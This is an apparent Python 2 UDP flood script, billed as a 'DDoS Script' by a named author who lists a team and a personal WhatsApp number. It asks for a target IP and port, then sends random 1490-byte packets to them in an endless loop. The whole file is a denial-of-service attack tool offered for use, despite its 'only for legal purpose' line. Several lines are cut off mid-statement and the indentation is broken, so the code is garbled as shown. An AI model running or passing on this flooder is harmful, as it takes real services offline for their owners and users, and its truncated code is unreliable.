

#!/usr/bin/python
# -*- coding: utf-8 -*-

# python 3.3.2+ WSC Ddos Script v.1
# by ./Tuan M4X1
# only for legal purpose
import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


sock = socket.socket(socket.AF_INET, socket.SOCK_D$
bytes = random._urandom(1490)


os.system("clear")
print
print "\033[34;1m---------------------------------$
#sleep 1
print "\033[31;1mAuthor by     : ./Tuan M4X1"
#sleep 1
print "\033[31;1mContact WA Me : +62895610024383"
#sleep 1
 print " \033[31;1mMy Team      : Wolf Scurity Cyber $
#sleep 1
print "\033[34;1m---------------------------------$
#sleep 1
ip = raw_input("\033[1;32mIP Target => ")
#sleep 1
port = input("\033[1;32mPort      => ")

os.system("clear")
os.system("figlet Dimulai")
sent = 0
while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 0
     print "Sent %s packet to %s throught port:%s"$
     if port == 65534:
       port = 0
